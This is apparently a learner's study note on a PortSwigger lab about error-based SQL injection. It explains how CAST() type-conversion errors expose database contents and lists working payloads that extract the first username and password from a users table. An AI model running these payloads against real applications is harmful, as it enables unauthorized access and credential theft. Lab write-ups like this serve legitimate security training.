---
title: Extracting sensitive data via verbose SQL error messages
Lab: "[Abusing SQL Error messages](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/extracting-sensitive-data-via-verbose-sql-error-messages)"
Video: "[SQL Error from Rana Khalil](https://www.youtube.com/watch?v=sAZV4z9rOVE)"
---
>[!Example]
>Using `CAST()` to force the conversion of data and generate a visible error, transforming a blind SQL injection into a visible one.
>`CAST((SELECT example_column FROM example_table) AS int)`

###  Method
- Identify if SQL Error are showing on application
- Use CAST() to change the data type and craw the database

' AND CAST((SELECT 1) as int)--
' AND CAST((SELECT username FROM users LIMIT 1) as int)--
' AND CAST((SELECT password FROM users LIMIT 1)as int)--.

### 1. Check if Application render verbose errors
We modify the query with something that could break the query and watch the response
`' AND CAST((SELECT 1) as int)--`

### 2. Check for username
Try to list the first username of database
`' AND CAST((SELECT username FROM users LIMIT 1) as int)--`

### 3. Check for first password on database
Because our user administrator was the first username, we can extract the first password and it will match the user
`' AND CAST((SELECT password FROM users LIMIT 1)as int)--.`

![[Pasted image 20260920225112.png]]

![[Pasted image 20260920224953.png]]

>[!NOTE]
>If the error mention it should be the data type  `BOOLEAN` we can run the query with
>` AND 1=CAST((SELECT username FROM users LIMIT1) as int)-- AND ` 
## SQL  Error Attack - Summary
Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter:

`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a `WHERE` statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

`CAST((SELECT example_column FROM example_table) AS int)`

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:

`ERROR: invalid input syntax for type integer: "Example data"`

This type of query may also be useful if a character limit prevents you from triggering conditional responses.